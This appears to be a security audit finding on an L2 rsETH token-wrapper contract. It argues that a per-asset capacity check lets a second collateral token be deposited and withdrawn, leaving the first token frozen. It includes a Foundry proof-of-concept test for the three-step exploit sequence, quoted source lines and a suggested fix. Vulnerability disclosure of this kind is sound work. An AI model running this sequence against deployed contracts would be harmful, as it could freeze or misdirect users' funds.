### Title
Cross-Token Drain via Broken Per-Asset Accounting in `depositBridgerAssets` — (`contracts/L2/RsETHTokenWrapper.sol`)

### Summary

`maxAmountToDepositBridgerAsset` computes available bridger capacity as `totalSupply() − balanceOf(specificAsset)`, ignoring all other allowed tokens already held by the wrapper. This allows the bridger to deposit tokenB even when the full `totalSupply` is already backed by tokenA, creating double-collateral. Any wrsETH holder can then drain tokenB via `_withdraw`, leaving tokenA permanently stranded with `totalSupply == 0`.

### Finding Description

`maxAmountToDepositBridgerAsset` is the only guard on `depositBridgerAssets`: [1](#0-0) 

It computes capacity per-asset in isolation:

```
return wrsETHSupply - balanceOfAssetInWrapper;   // only checks tokenB's own balance
```

It does **not** subtract the balances of other allowed tokens. So when tokenA already fully backs `totalSupply`, the formula still returns `totalSupply` as available capacity for tokenB.

`_withdraw` has no per-depositor or per-token accounting — it only checks `allowedTokens[_asset]` and burns wrsETH: [2](#0-1) 

`_deposit` mints wrsETH against any allowed token with no record of which token backed which shares: [3](#0-2) 

### Impact Explanation

After the exploit sequence below, `tokenA.balanceOf(wrapper) == N` while `totalSupply() == 0`. There is no function in the contract to rescue stranded ERC-20 tokens — the only exit paths are `withdraw`/`withdrawTo` (require burning wrsETH) and `depositBridgerAssets` (only deposits). tokenA is permanently frozen.

**Impact: Critical — Permanent freezing of funds.**

### Likelihood Explanation

Requires two conditions that are both part of normal protocol operation:

1. Two allowed tokens exist (the contract explicitly supports this via `addAllowedToken` / `reinitialize`).
2. The bridger deposits tokenB after tokenA already backs the supply — this is the normal bridger workflow (collateralizing pre-minted wrsETH), and the broken `maxAmountToDepositBridgerAsset` check does not prevent it.

No special role is needed for the final exploit step; any wrsETH holder can call `withdraw(tokenB, N)`.

### Recommendation

Replace the per-asset capacity check with a global one that sums all allowed token balances:

```solidity
// pseudocode
uint256 totalBacking = sum of balanceOf(wrapper) for each allowedToken;
return totalSupply() > totalBacking ? totalSupply() - totalBacking : 0;
```

This requires maintaining an enumerable list of allowed tokens (currently only a `mapping` exists, with no iteration capability). Alternatively, enforce that only one token may be active at a time, or track per-token deposits and restrict withdrawals to the same token.

### Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

// Invariant fuzz test (Foundry)
// Asserts: tokenA.balanceOf(wrapper) + tokenB.balanceOf(wrapper) <= wrapper.totalSupply()

function test_crossTokenDrain() public {
    uint256 N = 1e18;

    // Step 1: user deposits N tokenA → receives N wrsETH
    tokenA.mint(user, N);
    vm.prank(user);
    tokenA.approve(address(wrapper), N);
    vm.prank(user);
    wrapper.deposit(address(tokenA), N);
    // State: totalSupply=N, tokenA.bal=N, tokenB.bal=0

    // Step 2: bridger deposits N tokenB
    // maxAmountToDepositBridgerAsset(tokenB) = N - 0 = N  ← passes incorrectly
    tokenB.mint(bridger, N);
    vm.prank(bridger);
    tokenB.approve(address(wrapper), N);
    vm.prank(bridger);
    wrapper.depositBridgerAssets(address(tokenB), N);
    // State: totalSupply=N, tokenA.bal=N, tokenB.bal=N

    // Step 3: user withdraws tokenB (cross-token drain)
    vm.prank(user);
    wrapper.withdraw(address(tokenB), N);
    // State: totalSupply=0, tokenA.bal=N, tokenB.bal=0

    // Invariant broken: tokenA is permanently stranded
    assertEq(wrapper.totalSupply(), 0);
    assertEq(tokenA.balanceOf(address(wrapper)), N); // N tokenA locked forever
    // No wrsETH exists to redeem tokenA — permanent freeze
}
```

The broken invariant is:

```
tokenA.balanceOf(wrapper) + tokenB.balanceOf(wrapper) <= totalSupply()
```

After step 3: `N + 0 > 0` — invariant violated, funds permanently frozen. [4](#0-3)

### Citations

**File:** contracts/L2/RsETHTokenWrapper.sol (L99-110)
```text
    function maxAmountToDepositBridgerAsset(address _asset) public view returns (uint256) {
        if (!allowedTokens[_asset]) return 0;

        // get totalSupply of wrsETH minted
        uint256 wrsETHSupply = totalSupply();
        // balance of _asset with the contract
        uint256 balanceOfAssetInWrapper = ERC20Upgradeable(_asset).balanceOf(address(this));

        if (balanceOfAssetInWrapper > wrsETHSupply) return 0;

        return wrsETHSupply - balanceOfAssetInWrapper;
    }
```

**File:** contracts/L2/RsETHTokenWrapper.sol (L120-128)
```text
    function _withdraw(address _asset, address _to, uint256 _amount) internal {
        if (!allowedTokens[_asset]) revert TokenNotAllowed();

        _burn(msg.sender, _amount);

        ERC20Upgradeable(_asset).safeTransfer(_to, _amount);

        emit Withdraw(_asset, msg.sender, _to, _amount);
    }
```

**File:** contracts/L2/RsETHTokenWrapper.sol (L134-141)
```text
    function _deposit(address _asset, address _to, uint256 _amount) internal {
        if (!allowedTokens[_asset]) revert TokenNotAllowed();

        ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);

        _mint(_to, _amount);
        emit Deposit(_asset, msg.sender, _to, _amount);
    }
```

**File:** contracts/L2/RsETHTokenWrapper.sol (L162-170)
```text
    function depositBridgerAssets(address _asset, uint256 _amount) external onlyRole(BRIDGER_ROLE) {
        if (maxAmountToDepositBridgerAsset(_asset) < _amount) {
            revert CannotDeposit();
        }

        ERC20Upgradeable(_asset).safeTransferFrom(msg.sender, address(this), _amount);

        emit BridgerDeposited(_asset, msg.sender, _amount);
    }
```
